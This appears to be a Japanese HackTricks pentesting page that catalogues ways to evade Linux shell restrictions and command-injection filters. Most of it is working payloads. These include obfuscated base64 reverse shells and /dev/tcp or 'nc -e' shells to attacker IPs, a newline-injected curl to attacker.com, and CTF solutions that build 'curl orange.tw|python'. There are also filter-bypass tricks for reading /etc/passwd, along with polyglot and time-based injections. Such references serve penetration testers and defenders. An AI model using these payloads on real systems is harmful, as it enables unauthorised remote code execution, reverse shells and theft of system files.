# Linux の制限をバイパスする

{{#include ../../../banners/hacktricks-training.md}}

## 一般的な制限のバイパス

PayloadsAllTheThings、Bo0oM のチートシート、およびリンク先の 2 つの Secjuice の記事では、このセクションで扱う shell 構文のバリエーションについて説明しています。<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[4]](#references)</sup>

shell sink の特定と、blind execution の確認については、[Command Injection](../../../pentesting-web/command-injection.md) を参照してください。

### Reverse Shell

```bash
# Double-Base64 payload
echo "echo $(echo 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64 | base64)|ba''se''6''4 -''d|ba''se''64 -''d|b''a''s''h" | sed 's/ /${IFS}/g'
# echo${IFS}WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNHhNQzR4TkM0NEx6UTBORFFnTUQ0bU1Rbz0K|ba''se''6''4${IFS}-''d|ba''se''64${IFS}-''d|b''a''s''h
```

### 短い Rev shell

```bash
#Trick from Dikline
#Get a rev shell with
(sh)0>/dev/tcp/10.10.10.10/443
#Then get the out of the rev shell executing inside of it:
exec >&0
```

### Bypass Paths と禁止語句

```bash
# Question mark binary substitution
/usr/bin/p?ng # /usr/bin/ping
nma? -p 80 localhost # /usr/bin/nmap -p 80 localhost

# Wildcard(*) binary substitution
/usr/bin/who*mi # /usr/bin/whoami

# Wildcard + local directory arguments
touch -- -la # -- stops processing options after the --
ls *
echo * #List current files and folders with echo and wildcard

# [chars]
/usr/bin/n[c] # /usr/bin/nc

# Quotes
'p'i'n'g # ping
"w"h"o"a"m"i # whoami
ech''o test # echo test
ech""o test # echo test
bas''e64 # base64

#Backslashes
\u\n\a\m\e \-\a # uname -a
/\b\i\n/////s\h

# $@
who$@ami #whoami

# Transformations (case, reverse, base64)
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi") #whoami -> Upper case to lower case
$(a="WhOaMi";printf %s "${a,,}") #whoami -> transformation (only bash)
$(rev<<<'imaohw') #whoami
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==) #base64

# Execution through $0
echo whoami|$0

# Uninitialized variables: A uninitialized variable equals to null (nothing)
cat$u /etc$u/passwd$u # Use the uninitialized variable without {} before any symbol
p${u}i${u}n${u}g # Equals to ping, use {} to put the uninitialized variables between valid characters

# New lines
p\
i\
n\
g # These 4 lines will equal to ping

# Fake commands
p$(u)i$(u)n$(u)g # Equals to ping but 3 errors trying to execute "u" are shown
w`u`h`u`o`u`a`u`m`u`i # Equals to whoami but 5 errors trying to execute "u" are shown

# Concatenation of strings using history
!-1 # This will be substitute by the last command executed, and !-2 by the penultimate command
mi # This will throw an error
whoa # This will throw an error
!-1!-2 # This will execute whoami
```

### 禁止された空白文字のバイパス

```bash
# {form}
{cat,lol.txt} # cat lol.txt
{echo,test} # echo test

# IFS - Internal field separator, change " " for any other character ("]" in this case)
cat${IFS}/etc/passwd # cat /etc/passwd
cat$IFS/etc/passwd # cat /etc/passwd

# Put the command line in a variable and then execute it
IFS=];b=wget]10.10.14.21:53/lol]-P]/tmp;$b
IFS=];b=cat]/etc/passwd;$b # Using 2 ";"
IFS=,;`cat<<<cat,/etc/passwd` # Using cat twice
#  Other way, just change each space for ${IFS}
echo${IFS}test

# Using hex format
X=$'cat\x20/etc/passwd'&&$X

# Using tabs
echo "ls\x09-l" | bash

# Undefined variables and !
$u $u # This will be saved in the history and can be used as a space, please notice that the $u variable is undefined
uname!-1\-a # This equals to uname -a
```

### バックスラッシュとスラッシュのバイパス

```bash
cat ${HOME:0:1}etc${HOME:0:1}passwd
cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
```

### パイプのバイパス

```bash
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
```

### hex encodingによるBypass

```bash
echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
abc=$'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64';cat "$abc"
`echo $'cat\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'`
cat `xxd -r -p <<< 2f6574632f706173737764`
xxd -r -ps <(echo 2f6574632f706173737764)
cat `xxd -r -ps <(echo 2f6574632f706173737764)`
```

### 8進エスケープを使った文字を含まないコマンド名

Bash の ANSI-C `$'...'` クォートは、コマンドワードを構成する際に8進エスケープをデコードします。<sup>[[7]](#references)</sup>

そのため、`$`、シングルクォート、バックスラッシュ、数字、コマンド区切り文字が引き続き許可されている場合、文字の拒否リストでは不十分です。これは、正しくクォートされたデータ引数として渡される入力を回避するものではありません。<sup>[[13]](#references)</sup>

このローカルテストでは、`:` は先行するコマンドの代わりであり、`\151\144` は `id` にデコードされます。<sup>[[7]](#references)</sup> ワード区切り文字が使用できる場合、引数は別々のワードとしてエンコードできます。<sup>[[13]](#references)</sup>

```bash
:;$'\151\144'
```

### IPアドレスのバイパス

```bash
# Decimal IPs
127.0.0.1 == 2130706433
```

### 時間ベースのデータ流出

```bash
time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
```

### 環境変数から文字を取得する

```bash
echo ${LS_COLORS:10:1} #;
echo ${PATH:0:1} #/
```

### DNS data exfiltration

帯域外コールバックでは、Burp Collaboratorのようなcollaborator型サービスを使って、ターゲットアプリケーションに外部サーバーとの通信を発生させることができます。既存の[**pingb**](http://pingb.in)リンクは、現在利用可能であることを示すものではなく、過去の案内として残されています。<sup>[[6]](#references)</sup>

### Builtins

制限付きシェルでは、利用可能な組み込みコマンドが、以下の例で使える残りのコマンド手段となります。Bashの組み込みコマンドと実行構文については、Bashのドキュメントを参照してください。<sup>[[7]](#references)</sup> [**devploit**](https://twitter.com/devploit)によるアイデアです。\
まず、既存の[**shell builtins**](https://www.gnu.org/software/bash/manual/html_node/Shell-Builtin-Commands.html)の案内を確認し、次に以下のBash固有のテクニックを試してください。<sup>[[7]](#references)</sup>

```bash
# Get list of builtins
declare builtins

# In these cases PATH won't be set, so you can try to set it
PATH="/bin" /bin/ls
export PATH="/bin"
declare PATH="/bin"
SHELL=/bin/bash

# Hex
$(echo -e "\x2f\x62\x69\x6e\x2f\x6c\x73")
$(echo -e "\x2f\x62\x69\x6e\x2f\x6c\x73")

# Input
read aaa; exec $aaa #Read more commands to execute and execute them
read aaa; eval $aaa

# Get "/" char using printf and env vars
printf %.1s "$PWD"
## Execute /bin/ls
$(printf %.1s "$PWD")bin$(printf %.1s "$PWD")ls
## To get several letters you can use a combination of printf and
declare
declare functions
declare historywords

# Read flag in current dir
source f*
flag.txt:1: command not found: CTF{asdasdasd}

# Read file with read
while read -r line; do echo $line; done < /etc/passwd

# Get env variables
declare

# Get history
history
declare history
declare historywords

# Disable special builtins chars so you can abuse them as scripts
[ #[: ']' expected
## Disable "[" as builtin and enable it as script
enable -n [
echo -e '#!/bin/bash\necho "hello!"' > /tmp/[
chmod +x [
export PATH=/tmp:$PATH
if [ "a" ]; then echo 1; fi # Will print hello!
```

### ポリグロット command injection

```bash
1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
```

### バイパス可能な正規表現

```bash
# A regex that only allow letters and numbers might be vulnerable to new line characters
1%0a`curl http://attacker.com`
```

### Bashfuscator

以下の実行例では、オープンソースの Bash 難読化フレームワークである Bashfuscator を使用しています。コードコメント内のリポジトリリンクは、ナビゲーション用にそのまま残しています。<sup>[[8]](#references)</sup>

```bash
# From https://github.com/Bashfuscator/Bashfuscator
./bashfuscator -c 'cat /etc/passwd'
```

### 5文字でのRCE

以下の2つの歴史的な5文字の例は、チャレンジの再現用として掲載しています。主なチャレンジリポジトリは[Orange Tsai’s repository](https://github.com/orangetw/My-CTF-Web-Challenges)から入手できます。一方、コードブロック内の2つ目のwrite-upリンクはナビゲーション用で、現在アクセス可能かどうかは確認していません。<sup>[[9]](#references)</sup>

```bash
# From the Orange Tsai BabyFirst Revenge challenge: https://github.com/orangetw/My-CTF-Web-Challenges#babyfirst-revenge
#Orange Tsai solution
## Step 1: generate `ls -t>g` to file "_" to be able to execute ls ordening names by cration date
http://host/?cmd=>ls\
http://host/?cmd=ls>_
http://host/?cmd=>\ \
http://host/?cmd=>-t\
http://host/?cmd=>\>g
http://host/?cmd=ls>>_

## Step2: generate `curl orange.tw|python` to file "g"
## by creating the necesary filenames and writting that content to file "g" executing the previous generated file
http://host/?cmd=>on
http://host/?cmd=>th\
http://host/?cmd=>py\
http://host/?cmd=>\|\
http://host/?cmd=>tw\
http://host/?cmd=>e.\
http://host/?cmd=>ng\
http://host/?cmd=>ra\
http://host/?cmd=>o\
http://host/?cmd=>\ \
http://host/?cmd=>rl\
http://host/?cmd=>cu\
http://host/?cmd=sh _
# Note that a "\" char is added at the end of each filename because "ls" will add a new line between filenames whenwritting to the file

## Finally execute the file "g"
http://host/?cmd=sh g


# Another solution from https://infosec.rm-it.de/2017/11/06/hitcon-2017-ctf-babyfirst-revenge/
# Instead of writing scripts to a file, create an alphabetically ordered the command and execute it with "*"
https://infosec.rm-it.de/2017/11/06/hitcon-2017-ctf-babyfirst-revenge/
## Execute tar command over a folder
http://52.199.204.34/?cmd=>tar
http://52.199.204.34/?cmd=>zcf
http://52.199.204.34/?cmd=>zzz
http://52.199.204.34/?cmd=*%20/h*

# Another curiosity if you can read files of the current folder
ln /f*
## If there is a file /flag.txt that will create a hard link
## to it in the current folder
```

### 4文字でRCE

```bash
# In a similar fashion to the previous bypass this one just need 4 chars to execute commands
# it will follow the same principle of creating the command `ls -t>g` in a file
# and then generate the full command in filenames
# generate "g> ht- sl" to file "v"
'>dir'
'>sl'
'>g\>'
'>ht-'
'*>v'

# reverse file "v" to file "x", content "ls -th >g"
'>rev'
'*v>x'

# generate "curl orange.tw|python;"
'>\;\\'
'>on\\'
'>th\\'
'>py\\'
'>\|\\'
'>tw\\'
'>e.\\'
'>ng\\'
'>ra\\'
'>o\\'
'>\ \\'
'>rl\\'
'>cu\\'

# got shell
'sh x'
'sh g'
```

## Read-Only/Noexec/Distroless Bypass

**読み取り専用および noexec の保護が有効なファイルシステム内**、または**distroless イメージ**内にいる場合、Linux の `mount(8)` および Distroless プロジェクトで説明されている実行制約が環境に適用されます。リンク先のページでは、こうした制約下で作業するための手法をまとめています。<sup>[[11]](#references)[[12]](#references)</sup>

{{#ref}}
bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

## Chroot & other Jails Bypass

{{#ref}}
../../main-system-information/escaping-from-limited-bash.md
{{#endref}}

## Space-Based Bash NOP Sled ("Bashsledding")

脆弱性によって、最終的に `system()` や別のシェルに渡される引数を部分的に制御できる場合、payload のオフセットが不確かなことがあります。Alan Cao と Will Tan は、shell payload をメモリマップされた NVRAM にばらまき、その先頭にスペースを付ける、組み込みデバイスにおける制約付きの事例を紹介しています。<sup>[[5]](#references)</sup>

そのため、実際のコマンドの先頭に長いスペースまたはタブ文字の並びを付けて、*Bash 用の NOP sled* を作成できます。Bash では、スペースとタブは単純なコマンド内で単語を区切るブランクとして定義されています。<sup>[[5]](#references)[[7]](#references)</sup>

```bash
# Payload sprayed into an environment variable / NVRAM entry
"                nc -e /bin/sh 10.0.0.1 4444"
# 16× spaces ───┘ ↑ real command
```

ROP chain（または別のメモリ破壊プリミティブ）が、空白ブロック内のどこかを指すコマンド文字列ポインターを渡す場合、Bashはコマンドに到達するまで先頭の空白を読み飛ばせます。引用されたルーターのexploitでは、これにより不確かな文字列オフセットを利用できました。<sup>[[5]](#references)[[7]](#references)</sup>

制約のある組み込みターゲットでの実用例には、次のようなものがあります。<sup>[[5]](#references)</sup>

1. プロセス間でアクセス可能な**メモリマップされた設定データ**（例: NVRAM）。<sup>[[5]](#references)</sup>
2. 攻撃者がペイロードの位置合わせにNULLバイトを書き込めないペイロードチャネル（位置合わせ問題への一般的な応用）。<sup>[[5]](#references)</sup>
3. 小規模なBusyBox `ash`/`sh`環境を備えた組み込みデバイス。BusyBoxは、リソースに制約のあるシステム向けのアプレットとしてこれらを説明しています。<sup>[[10]](#references)</sup>

> 🛠️  制御されたラボ環境で、この手法を`system()`を呼び出すROP gadgetと組み合わせてください。引用されたルーター研究では、制約のあるハードウェアでこの組み合わせを実証しています。<sup>[[5]](#references)</sup>



## References

- [1] [PayloadsAllTheThings - Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits)
- [2] [Bo0oM - WAF-bypass-Cheat-Sheet](https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet)
- [3] [Web Application Firewall (WAF) 回避テクニック #2 - theMiddle](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0)
- [4] [Web Application Firewall (WAF) 回避テクニック #3 - theMiddle](https://www.secjuice.com/web-application-firewall-waf-evasion/)
- [5] [Alan Cao and Will Tan — 放棄されたハードウェアのゼロデイを悪用する – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [6] [Burp Collaborator - PortSwigger](https://portswigger.net/burp/documentation/desktop/tools/collaborator)
- [7] [bash(1) — Linux マニュアルページ](https://man7.org/linux/man-pages/man1/bash.1.html)
- [8] [Bashfuscator](https://github.com/Bashfuscator/Bashfuscator)
- [9] [My-CTF-Web-Challenges — Orange Tsai](https://github.com/orangetw/My-CTF-Web-Challenges)
- [10] [BusyBox](https://busybox.net/downloads/BusyBox.html)
- [11] [mount(8) — Linux マニュアルページ](https://man7.org/linux/man-pages/man8/mount.8.html)
- [12] [Distroless](https://github.com/GoogleContainerTools/distroless)
- [13] [Dojo CTF #36: Shell Escape 解説 — YesWeHack](https://www.yeswehack.com/dojo/dojo-ctf-challenge-winners-36)
{{#include ../../../banners/hacktricks-training.md}}
